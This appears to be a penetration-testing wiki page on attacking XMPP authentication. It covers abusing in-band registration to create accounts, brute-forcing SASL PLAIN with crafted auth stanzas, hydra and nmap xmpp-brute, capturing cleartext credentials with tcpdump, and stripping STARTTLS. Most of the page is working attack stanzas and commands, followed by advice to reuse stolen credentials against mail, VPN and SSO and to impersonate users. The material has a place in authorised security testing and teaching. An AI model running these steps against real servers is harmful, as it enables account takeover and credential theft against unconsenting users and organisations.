---
title: "Authentication: SASL, in-band registration, and mechanism downgrade"
description: "XMPP authenticates with SASL over the stream (PLAIN, SCRAM, DIGEST-MD5), so credentials can be brute-forced by replaying AUTHENTICATE stanzas. In-band registration lets an attacker self-provision an account with no credential where it is enabled, and when STARTTLS is not enforced the PLAIN mechanism sends the password in base64 cleartext, capturable on the wire or forced by a downgrade."
keywords:
  - XMPP SASL
  - in-band registration
  - SASL PLAIN
  - mechanism downgrade
  - XMPP brute force
---

# Authentication

XMPP authentication rides on SASL inside the XML stream. After the stream opens, the server advertises its mechanisms in `<stream:features>`, and the client picks one and sends an `<auth>` stanza; the server replies `<success/>` or `<failure/>`. Three things make this attackable: the `<auth>` exchange is a compact, scriptable request so SASL is brute-forceable; in-band registration (XEP-0077) lets anyone create an account on servers that allow it, giving a credential from nothing; and PLAIN carries the password as base64 (not encryption), so if STARTTLS is only offered rather than required, the credential is recoverable from captured traffic or by steering the client to PLAIN.

## Preconditions

An opened stream showing `<stream:features>`. Note which mechanisms are listed (PLAIN, SCRAM-SHA-1, SCRAM-SHA-256, DIGEST-MD5) and, critically, whether `<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls>` is present. If STARTTLS is required, downgrade and cleartext capture are off the table and you are limited to SASL brute force over TLS and in-band registration. In-band registration is only usable if [enumeration](enumeration.md) showed a `jabber:iq:register` form.

## In-band registration to self-provision

```xml
<!-- request the registration form, then submit it to create the account -->
<iq type='get' id='r1' to='target.lan'><query xmlns='jabber:iq:register'/></iq>

<iq type='set' id='r2' to='target.lan'>
  <query xmlns='jabber:iq:register'>
    <username>recon</username>
    <password>Autumn2026!</password>
  </query>
</iq>
<!-- <iq type='result' id='r2'/> => the account recon@target.lan now exists and is yours -->
<!-- <error><conflict/></error> => the username is taken; <not-acceptable/> => registration closed -->
```

A `type='result'` means you now hold a real account on the server with no prior credential, enough to run authenticated service discovery, join rooms, read the user directory, and reach the admin component if authorization is weak.

## SASL and brute force

The PLAIN payload is `authzid\0authcid\0password` base64-encoded, sent in a single `<auth>` stanza:

```bash
printf '\0jdoe\0Summer2026!' | base64
# => AGpkb2UAU3VtbWVyMjAyNiE=
```

```xml
<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>AGpkb2UAU3VtbWVyMjAyNiE=</auth>
<!-- <success xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/> => valid credential -->
<!-- <failure><not-authorized/></failure> => wrong password -->
```

Interpret `<success/>` as a confirmed login (the account and the whole mechanism are yours) and `<failure><not-authorized/></failure>` as a bad password; iterate the base64 line over a wordlist. Tooling automates this against a user list:

```bash
hydra -L users.txt -P rockyou.txt xmpp://target.lan
# nmap also brute-forces SASL: --script xmpp-brute
nmap -p5222 --script xmpp-brute --script-args userdb=users.txt,passdb=rockyou.txt target.lan
```

## Mechanism downgrade and cleartext capture

If `<starttls>` is offered without `<required/>`, you can complete SASL PLAIN without ever negotiating TLS, so the base64 password crosses the wire in the clear; an on-path position recovers it directly:

```bash
tcpdump -i eth0 -A 'tcp port 5222' | grep -A1 "mechanism='PLAIN'"
# base64-decode the <auth> payload to split authcid and password on the \0 bytes
```

Because the server advertised PLAIN, a positioned attacker can also strip or suppress the STARTTLS offer so a client that would have upgraded negotiates PLAIN in cleartext instead, turning any login on that segment into a captured credential.

## Follow-on

- A self-provisioned or brute-forced account unlocks authenticated enumeration, the admin component, and the ability to message and impersonate real users on the roster.
- Captured PLAIN credentials are usually directory accounts reused across the organization; test them against mail, VPN, and SSO.
- An account on the server is the foothold for the admin-console and plugin paths in [server exploitation](server-exploitation.md).

## References

- [RFC 6120 (XMPP Core, SASL)](https://datatracker.ietf.org/doc/html/rfc6120#section-6)
- [XEP-0077 In-Band Registration](https://xmpp.org/extensions/xep-0077.html)
- [Nmap xmpp-brute script](https://nmap.org/nsedoc/scripts/xmpp-brute.html)
